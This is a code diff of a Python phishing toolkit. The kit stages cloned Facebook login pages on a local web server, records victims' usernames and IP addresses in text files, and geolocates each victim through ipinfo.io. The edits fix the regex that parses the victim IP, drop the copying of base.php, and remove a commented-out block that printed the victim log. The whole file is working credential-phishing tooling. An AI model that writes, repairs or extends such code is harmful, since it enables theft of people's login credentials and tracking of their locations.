@@ -75,7 +75,7 @@ def loadModule(module):
  [{1}*{0}]{1} %s module loaded. Building site...{0}'''.format(CYAN, END) % module
 
 def runPhishing(social, option2):
-    system('sudo rm -Rf Server/www/*.* && touch Server/www/usernames.txt && touch Server/www/iplog.txt && touch Server/www/ip.txt && cp WebPages/base.php Server/www/ && cp WebPages/ip.php Server/www/')
+    system('sudo rm -Rf Server/www/*.* && touch Server/www/usernames.txt && touch Server/www/iplog.txt && touch Server/www/ip.txt && cp WebPages/ip.php Server/www/')
     if option2 == '1' and social == 'Facebook':
         copy_tree("WebPages/fb_standard/", "Server/www/")
     if option2 == '2' and social == 'Facebook':
@@ -148,7 +148,7 @@ def waitCreds():
         with open('Server/www/ip.txt') as creds:
             lines = creds.read().rstrip()
         if len(lines) != 0: 
-            ip = re.match('victim public ip: (.*)', lines).group(1)
+            ip = re.match('Victim Public IP: (.*?)\n', lines).group(1)
             resp = urlopen('https://ipinfo.io/%s/json' % ip).read()
             ipinfo = json.loads(resp)
             matchObj = re.match('^(.*?),(.*)$', ipinfo['loc'])
@@ -164,17 +164,6 @@ def waitCreds():
             
         creds.close()
         
-        '''
-        with open('Server/www/iplog.txt') as creds:
-            lines = creds.read().rstrip()
-        if len(lines) != 0: 
-            print '======================================================================'.format(RED, END)
-            print ' {0}[ VICTIM INFO FOUND ]{1}:\n {0}%s{1}'.format(GREEN, END) % lines
-            system('rm -rf Server/www/iplog.txt && touch Server/www/iplog.txt')
-            print '======================================================================'.format(RED, END)
-            
-        creds.close()
-        '''
 
 def runPEnv():
     system('clear')
